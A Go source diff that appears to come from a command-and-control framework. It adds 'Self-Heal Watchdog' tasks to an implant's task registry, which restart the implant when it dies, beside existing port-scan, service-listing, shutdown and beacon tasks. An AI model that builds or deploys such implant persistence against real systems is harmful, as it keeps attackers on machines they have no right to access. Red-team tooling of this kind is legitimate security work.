@@ -54,6 +54,11 @@ func init() {
 		{Type: TaskTypeShutdown, Name: "Shutdown", Description: "Shut down the system", Category: "impact"},
 		{Type: TaskTypeDrives, Name: "List Drives", Description: "List available drives", Category: "discovery"},
 		{Type: TaskTypeBeaconNow, Name: "Beacon Now", Description: "Force immediate beacon check-in", Category: "c2"},
+		{Type: TaskTypeWatchdogStart, Name: "Self-Heal Watchdog Start", Description: "Launch a detached sibling process that restarts the implant when it dies (bounded restart count)", Category: "c2",
+			Parameters: []TaskParam{
+				{Name: "command", Type: "string", Required: false, Description: "interval_seconds:max_restarts (default 15:10; interval 5-300 s, restarts 1-50)"},
+			}},
+		{Type: TaskTypeWatchdogStop, Name: "Self-Heal Watchdog Stop", Description: "Stop the self-heal watcher for this agent", Category: "c2"},
 		{Type: TaskTypeServices, Name: "List Services", Description: "List Windows services", Category: "discovery"},
 		{Type: TaskTypePortscan, Name: "Port Scan", Description: "Scan TCP ports on a target", Category: "discovery",
 			Parameters: []TaskParam{{Name: "command", Type: "string", Required: true, Description: "Target and ports"}}},
